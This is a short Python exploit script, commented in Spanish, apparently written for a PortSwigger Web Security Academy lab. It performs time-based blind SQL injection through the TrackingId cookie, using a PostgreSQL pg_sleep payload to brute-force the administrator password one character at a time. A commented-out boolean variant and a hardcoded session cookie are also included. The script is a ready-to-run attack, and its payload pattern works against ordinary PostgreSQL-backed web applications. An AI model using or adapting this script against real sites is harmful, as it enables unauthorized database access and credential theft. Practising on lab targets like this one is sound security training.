#!/usr/bin/python3
from pwn import *
import requests,signal ,time,pdb,sys,string
import time

def def_handler(sig,frame):
   print("\n\n [!] Saliendo... \n")
   sys.exit(1)

# ctrl + c
signal.signal(signal.SIGINT,def_handler)

main_url = "https://0a7b0085035e05c982ca4890000900ce.web-security-academy.net/"

characters = string.ascii_lowercase + string.digits + string.ascii_uppercase # caracteres lower case  + upper cas + numeros

def make_requests():
   password = ""

   p1 = log.progress("Fuerza bruta") # nombre la barra de progreso
   p1.status("iniciando Ataque de fuerza bruta")

   time.sleep(2)

   p2 = log.progress("password") # nombre de la 2 barra de progreso


   for posicion in range(1,21): #tamaño de la contraseña es 20 longitud
      for character in characters:
         #COOKIES VULNERABLES A SQL INJECTION
         cookies = {
         #'TrackingId' : "aI7htw8h5K5p9nsH'  and (select substring(password,%d,1) from users  where username='administrator')='%s" % (posicion,character),
         'TrackingId' : "Gy3TXaYnfSL2TjM4'||(SELECT CASE WHEN SUBSTRING(password,%d,1)='%s' THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users where  username='administrator')-- -" % (posicion,character),
         'session': 'TnYaZkYbsu9QJFuBPS3VF8frQBa7SA7I'
         }

         p1.status("Posición {}: Probando carácter '{}'".format(posicion, character))

         time_start = time.time()
         r = requests.get(main_url,cookies=cookies) # respuesta de la peticion se almacena en r

         time_end = time.time()

    

         #si en la respuesta es presente la palabra que es el que indica si fue existoso o no 
         #!!! IMPORTANTE !!! TIENEN OTROS METODOS COMO : r.status_code , r.headers , r.cookies , r.text , r.json() , r.url
         if time_end - time_start > 2 : 
            password += character
            p2.status(password) # resultado de la 2 barra  de progreso
            break

if __name__ == '__main__':
   make_requests()
